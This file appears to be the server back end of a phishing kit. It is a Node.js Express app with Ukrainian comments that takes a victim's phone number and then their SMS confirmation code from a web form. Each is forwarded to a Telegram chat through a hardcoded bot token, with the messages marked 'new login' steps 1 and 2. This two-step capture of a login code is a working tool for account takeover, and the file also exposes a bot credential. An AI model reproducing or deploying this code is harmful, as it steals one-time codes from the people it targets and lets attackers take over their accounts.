const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch'); // Використовуємо node-fetch для HTTP-запитів

const app = express();
const port = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "7639782846:AAH75R2_5sggh42TL_pAsjNdQDDqfcZ4cSU"; 
const CHAT_ID = "-5058613889"; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
// ==============================

// Використовуємо middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// 1. Обслуговуємо статичні файли (index.html, CSS, JS) з кореня
app.use(express.static(path.join(__dirname, '/')));

/**
 * Функція для відправки повідомлення у Telegram
 * @param {string} message - Текст повідомлення
 */
async function sendToTelegram(message) {
    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });

        const data = await response.json();
        return data.ok; // true, якщо успішно
    } catch (error) {
        console.error('Помилка відправки в Telegram:', error);
        return false;
    }
}

// 2. API-ендпоінт для прийому даних з форми
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code } = req.body;
    let message = '';

    if (step === 'phone' && phone) {
        // КРОК 1: Телефон
        message = `🚨 **НОВИЙ ВХІД / КРОК 1**\n\nНомер телефону: \`${phone}\``;
    } else if (step === 'code' && code) {
        // КРОК 2: Код
        message = `✅ **ПІДТВЕРДЖЕННЯ / КРОК 2**\n\nSMS-код: \`${code}\``;
    } else {
        return res.status(400).json({ success: false, message: 'Неправильні дані.' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        res.status(200).json({ success: true, message: 'Дані успішно відправлені.' });
    } else {
        res.status(500).json({ success: false, message: 'Помилка відправки в Telegram.' });
    }
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
